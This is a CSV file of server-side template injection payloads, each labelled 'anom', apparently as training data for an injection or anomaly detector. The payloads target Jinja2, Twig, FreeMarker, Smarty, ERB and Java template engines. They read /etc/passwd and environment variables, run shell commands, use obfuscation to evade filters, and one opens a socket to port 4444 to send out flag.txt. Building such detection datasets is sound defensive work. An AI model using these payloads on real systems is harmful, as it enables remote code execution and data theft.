payload,label
{{4*4}}[[5*5]],anom
{{7*7}},anom
{{7*'7'}},anom
<%= 7 * 7 %>,anom
${3*3},anom
${{7*7}},anom
@(1+2),anom
#{3*3},anom
#{ 7 * 7 },anom
{{dump(app)}},anom
"{{app.request.server.all|join(',')}}",anom
{{config.items()}},anom
{{ [].class.base.subclasses() }},anom
{{''.class.mro()[1].subclasses()}},anom
{{ ''.__class__.__mro__[2].__subclasses__() }},anom
"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",anom
{{'a'.toUpperCase()}} ,anom
{{ request }},anom
{{self}},anom
<%= File.open('/etc/passwd').read %>,anom
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",anom
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},anom
"${""freemarker.template.utility.Execute""?new()(""id"")}",anom
"{{app.request.query.filter(0,0,1024,{'options':'system'})}}",anom
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }},anom
"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/etc/passwd"").read() }}",anom
"{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",anom
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},anom
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",anom
{$smarty.version},anom
{php}echo `id`;{/php},anom
{{['id']|filter('system')}},anom
{{['cat\x20/etc/passwd']|filter('system')}},anom
{{['cat$IFS/etc/passwd']|filter('system')}},anom
"{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",anom
"{{request|attr([""_""*2,""class"",""_""*2]|join)}}",anom
"{{request|attr([""__"",""class"",""__""]|join)}}",anom
"{{request|attr(""__class__"")}}",anom
{{request.__class__}},anom
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},anom
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",anom
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",anom
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",anom
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",anom
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""ip\"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/cat\"", \""flag.txt\""]);'"").read().zfill(417)}}{%endif%}{% endfor %}",anom
${T(java.lang.System).getenv()},anom
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},anom
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},anom
